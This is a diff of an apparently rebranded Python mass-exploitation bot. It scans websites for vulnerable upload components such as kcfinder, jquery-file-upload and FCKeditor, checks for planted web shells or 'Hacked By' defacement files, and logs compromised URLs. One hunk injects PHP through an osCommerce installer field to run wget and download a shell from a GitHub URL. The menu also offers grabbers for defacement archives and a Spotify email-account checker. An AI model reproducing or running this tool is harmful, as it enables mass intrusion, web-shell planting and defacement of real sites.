 				open('Exploited/shells.txt', 'a').write(url+'/admin/ckeditor/kcfinder/upload/files/up.php.jd'+'\n')
 				sys.exit()
@@ -6016,7 +5979,7 @@ def botv1():
 			
 			lib = requests.get(url+"/libraries/jscripts/kcfinder/upload/files/up.php.jd")
 
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
+			if 'MarGusFRom1337School' in lib.content:
 				print '\033[92m[>] \033[0mExploit Kcfinder5 \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/shells.txt', 'a').write(url+'/libraries/jscripts/kcfinder/upload/files/up.php.jd'+'\n')
 				sys.exit()
@@ -6036,7 +5999,7 @@ def botv1():
 			
 			lib = requests.get(url+"/ckeditor/kcfinder/upload/files/up.php.jd")
 
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
+			if 'MarGusFRom1337School' in lib.content:
 				print '\033[92m[>] \033[0mExploit Kcfinder6 \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/shells.txt', 'a').write(url+'/ckeditor/kcfinder/upload/files/up.php.jd'+'\n')
 				sys.exit()
@@ -6052,7 +6015,7 @@ def botv1():
 			
 			lib = requests.get(url+"/js/ckeditor/kcfinder/upload/files/up.php.jd")
 
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
+			if 'MarGusFRom1337School' in lib.content:
 				print '\033[92m[>] \033[0mExploit Kcfinder7 \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/shells.txt', 'a').write(url+'/js/ckeditor/kcfinder/upload/files/up.php.jd'+'\n')
 				sys.exit()
@@ -6072,7 +6035,7 @@ def botv1():
 			
 			lib = requests.get(url+"/scripts/jquery/kcfinder/upload/files/up.php.jd")
 
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
+			if 'MarGusFRom1337School' in lib.content:
 				print '\033[92m[>] \033[0mExploit Kcfinder8 \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/shells.txt', 'a').write(url+'/scripts/jquery/kcfinder/upload/files/up.php.jd'+'\n')
 				sys.exit()
@@ -6092,7 +6055,7 @@ def botv1():
 			
 			lib = requests.get(url+"/kcfinder-2.51/upload/files/up.php.jd")
 
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
+			if 'MarGusFRom1337School' in lib.content:
 				print '\033[92m[>] \033[0mExploit Kcfinder9 \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/shells.txt', 'a').write(url+'/kcfinder-2.51/upload/files/up.php.jd'+'\n')
 				sys.exit()
@@ -6112,7 +6075,7 @@ def botv1():
 			
 			lib = requests.get(url+"/assets/js/mylibs/kcfinder/upload/files/up.php.jd")
 
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
+			if 'MarGusFRom1337School' in lib.content:
 				print '\033[92m[>] \033[0mExploit Kcfinder10 \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/shells.txt', 'a').write(url+'/assets/js/mylibs/kcfinder/upload/files/up.php.jd'+'\n')
 				sys.exit()
@@ -6146,7 +6109,7 @@ def botv1():
 			
 			lib = requests.get(url+'/tpl/plugins/upload9.1.0/server/php/up.php')
 
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
+			if 'MarGusFRom1337School' in lib.content:
 				print '\033[92m[>] \033[0mExploit BuilderEngine \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/Shells.txt', 'a').write(url+'/themes/dashboard/assets/plugins/jquery-file-upload/server/php/up.php'+'\n')
 				sys.exit()
@@ -6164,7 +6127,7 @@ def botv1():
 			
 			lib = requests.get(url+"/server/php/files/up.php")
 
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
+			if 'MarGusFRom1337School' in lib.content:
 				print '\033[92m[>] \033[0mExploit Arrayfiles \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/shells.txt', 'a').write(url+'/server/php/files/up.php'+'\n')
 				sys.exit()
@@ -6183,7 +6146,7 @@ def botv1():
 			
 			lib = requests.get(url+"/images/block/up.php")
 
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
+			if 'MarGusFRom1337School' in lib.content:
 				print '\033[92m[>] \033[0mExploit Design Factory \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/shells.txt', 'a').write(url+'/images/block/up.php'+'\n')
 				sys.exit()
@@ -6202,7 +6165,7 @@ def botv1():
 			
 			lib = requests.get(url+"/vehiculo_photos/server/php/files/up.php")
 
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
+			if 'MarGusFRom1337School' in lib.content:
 				print '\033[92m[>] \033[0mExploit vehiculo \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/shells.txt', 'a').write(url+'/vehiculo_photos/server/php/files/up.php'+'\n')
 				sys.exit()
@@ -6221,7 +6184,7 @@ def botv1():
 			
 			lib = requests.get(url+"/tpl/plugins/upload9.1.0/server/php/files/up.php")
 
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
+			if 'MarGusFRom1337School' in lib.content:
 				print '\033[92m[>] \033[0mExploit upload9.1.0 \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/shells.txt', 'a').write(url+'/tpl/plugins/upload9.1.0/server/php/files/up.php'+'\n')
 				sys.exit()
@@ -6239,7 +6202,7 @@ def botv1():
 			
 			lib = requests.get(url+"/public/upload_nhieuanh/server/php/files/up.php")
 
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
+			if 'MarGusFRom1337School' in lib.content:
 				print '\033[92m[>] \033[0mExploit Filecms \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/shells.txt', 'a').write(url+'/public/upload_nhieuanh/server/php/files/up.php'+'\n')
 				sys.exit()
@@ -6255,7 +6218,7 @@ def botv1():
 			
 			lib = requests.get(url+"/assets/global/plugins/jquery-file-upload/server/php/files/up.php")
 
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
+			if 'MarGusFRom1337School' in lib.content:
 				print '\033[92m[>] \033[0mExploit jquery \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/shells.txt', 'a').write(url+'/assets/global/plugins/jquery-file-upload/server/php/files/up.php'+'\n')
 				sys.exit()
@@ -6272,7 +6235,7 @@ def botv1():
 			
 			lib = requests.get(url+"/web/image/Images/up.php")
 
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
+			if 'MarGusFRom1337School' in lib.content:
 				print '\033[92m[>] \033[0mExploit Keybase \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/shells.txt', 'a').write(url+'/web/image/Images/up.php'+'\n')
 				sys.exit()
@@ -6288,7 +6251,7 @@ def botv1():
 			
 			lib = requests.get(url+"/AndroidFileUpload/uploads/up.php")
 
-			if 'MisterSpyShellForV7Bot0X_istanbul_2019' in lib.content:
+			if 'MarGusFRom1337School' in lib.content:
 				print '\033[92m[>] \033[0mExploit AndroidFile \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
 				open('Exploited/shells.txt', 'a').write(url+'/web/image/Images/up.php'+'\n')
 				sys.exit()
@@ -6304,11 +6267,11 @@ def botv1():
 
 			
 			
-			lib = requests.get(url+"/userfiles/file/spy.txt")
+			lib = requests.get(url+"/userfiles/file/mrgs.txt")
 
-			if 'Hacked By Mister Spy' in lib.content:
+			if 'Hacked By MarGus' in lib.content:
 				print '\033[92m[>] \033[0mExploit FckEditor \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
-				open('Exploited/index.txt', 'a').write(url+'/userfiles/file/spy.txt'+'\n')
+				open('Exploited/index.txt', 'a').write(url+'/userfiles/file/mrgs.txt'+'\n')
 				sys.exit()
 			else:
 				print '\033[92m[>] \033[0mExploit FckEditor  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
@@ -6321,11 +6284,11 @@ def botv1():
 
 			
 			
-			lib = requests.get(url+"/ficheiros/conteudos/spy.txt")
+			lib = requests.get(url+"/ficheiros/conteudos/mrgs.txt")
 
-			if 'Hacked By Mister Spy' in lib.content:
+			if 'Hacked By MarGus' in lib.content:
 				print '\033[92m[>] \033[0mExploit Netvidade \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
-				open('Exploited/index.txt', 'a').write(url+'/ficheiros/conteudos/spy.txt'+'\n')
+				open('Exploited/index.txt', 'a').write(url+'/ficheiros/conteudos/mrgs.txt'+'\n')
 				sys.exit()
 			else:
 				print '\033[92m[>] \033[0mExploit Netvidade  \033[91m[Failed] '.format(sb, sd, url, fc,fc, sb,fr)
@@ -6343,7 +6306,7 @@ def botv1():
 				Exp = url + '/install/install.php?step=4'
 				data = {'DIR_FS_DOCUMENT_ROOT': './'}
 				shell = '\');'
-				shell += 'system("wget https://raw.githubusercontent.com/MisterSpyx/Mister-Spy-Bot-V4/master/v4rdp/up.php");'
+				shell += 'system("wget https://raw.githubusercontent.com/M4rgs/MargBot-v5/refs/heads/main/Files/up.php");'
 				shell += '/*'
 				data['DB_DATABASE'] = shell
 				zonn = requests.post(Exp, data=data)
@@ -6432,7 +6395,7 @@ def spotii():
 	rl = "http://www.spotify.com/us/xhr/json/isEmailAvailable.php?signup_form[email]="
 
 	try:
-		ok = raw_input("{}root@kil3r~# Entre List Email: ".format(fy,sn))
+		ok = raw_input("{}root@mrgs~# Entre List Email: ".format(fy,sn))
 		okd = open(ok, 'r')
 	except:
 		print("{}zebi  entre list  email -_- nooob").format(fh,sn)
@@ -6466,37 +6429,20 @@ def slowprint(s):
 
 def helper4():
 	clearscrn()
-	banner = """\033[94m
-                             _       _       _  ___ _ _____      
-   / \   _ __ ___   __ _ ___(_) __ _| |__   | |/ (_) |___ / _ __ 
-  / _ \ | '_ ` _ \ / _` |_  / |/ _` | '_ \  | ' /| | | |_ \| '__|
- / ___ \| | | | | | (_| |/ /| | (_| | | | | | . \| | |___) | |   
-/_/   \_\_| |_| |_|\__,_/___|_|\__, |_| |_| |_|\_\_|_|____/|_|   
-                               |___/                             
-		  
-	"""
-	print("""\033[95m
-                             _       _       _  ___ _ _____      
-   / \   _ __ ___   __ _ ___(_) __ _| |__   | |/ (_) |___ / _ __ 
-  / _ \ | '_ ` _ \ / _` |_  / |/ _` | '_ \  | ' /| | | |_ \| '__|
- / ___ \| | | | | | (_| |/ /| | (_| | | | | | . \| | |___) | |   
-/_/   \_\_| |_| |_|\__,_/___|_|\__, |_| |_| |_|\_\_|_|____/|_|   
-                               |___/                             
-		  
-                                  Script Name : Mnanok Tester ^_^
-                	Greetz To : \033[93mKabyles \033[92mHackers  \033[91m|D\033[92mz| \033[91mAlgeria \033[92mHackers
-                                     """)
-	slowprint("\n\t\t\t\t\tPowered By : Trojan Kil3r Amazigh / Aziz" + "\n\t\t\t\t\t\t            Facebook : fb.com/amazigh.kil3r")
+	bb = open('Files/banner.txt', 'r').read()
+    	clear = "\x1b[0m"
+    	colors = [36, 32, 34, 35, 31, 37]
+    	for N, line in enumerate(bb.split("\n")):
+        	sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
+        	time.sleep(0.02)
+	slowprint("\n\t\t\t\t\tPowered By : MarGus" + "\n\t\t\t\t    Github : https:://github.com/M4rgs")
 	print("")
 	print("""
-		|   \033[91m[0] \033[93mBot Upload Shells!
-
-		|   \033[91m[1] \033[95mGrabb Sites \033[92m From Zone-h.org  
-		|   \033[91m[2] \033[95mGrabb Sites \033[92m From Br.Zone-h.org
-
-		|   \033[91m[3] \033[95mGrabb Sites \033[92m From mirror-h.org     
-		|   \033[91m[4] \033[95mGrabb Sites \033[92m From aljyyosh.org.com |
-		
+		\033[91m[0] \033[93mBot Upload Shel
+		\033[91m[1] \033[95mGrabb Sites \033[92m From Zone-h.org  
+		\033[91m[2] \033[95mGrabb Sites \033[92m From Br.Zone-h.
+		\033[91m[3] \033[95mGrabb Sites \033[92m From mirror-h.org     
+		\033[91m[4] \033[95mGrabb Sites \033[92m From aljyyosh.org.com |
 		\033[91m[5] \033[95mGet Sites bypass With List [Bypass Finder]
 		\033[91m[6] \033[95mMass Add (http://) To List ^_^
 		\033[91m[7] \033[95mGrabber Sites From Bing :D
@@ -6505,50 +6451,48 @@ def helper4():
 
 
 			#######################################################
-			# 	  Love 4 Palestine |\033[91m| Live 4 Palestine        #
+			# 	                TaHa i5 H3Re !                 #
 			#######################################################
 			""")		
 	try:
-		qq = int(raw_input("\033[91m[-] \033[90mroot@kil3r~# \033[92mChoose Section !!\033[95m : \033[90m"))
+		qq = int(raw_input("\033[91m[-] \033[90mroot@mrgs~# \033[92mChoose Section !!\033[95m : \033[90m"))
 		if qq == 0:
-			clearscrn()
-			print(banner)
-			botv1()
+			botv5()
 		if qq == 1:
 			clearscrn()
-			print(banner)
+			print(bb)
 			zonehh()
 		if qq == 3:
 			clearscrn()
-			print(banner)
+			print(bb)
 			mirroirh()
 		if qq == 4:
 			clearscrn()
-			print(banner)
+			print(bb)
 			overflowzone()
 		if qq == 2:
 			clearscrn()
-			print(banner)
+			print(bb)
 			zonehBR()
 		if qq == 5:
 			clearscrn()
-			print(banner)
+			print(bb)
 			bYPAS()
 		if qq == 6:
 			clearscrn()
-			print(banner)
+			print(bb)
 			add_http()
 		if qq == 7:
 			clearscrn()
-			print(banner)
+			print(bb)
 			binger()
 		if qq == 8:
 			clearscrn()
-			print(banner)
+			print(bb)
 			cms_detected()
 		if qq == 9:
 			clearscrn()
-			print(banner)
+			print(bb)
 			spotii()
 
 	except:
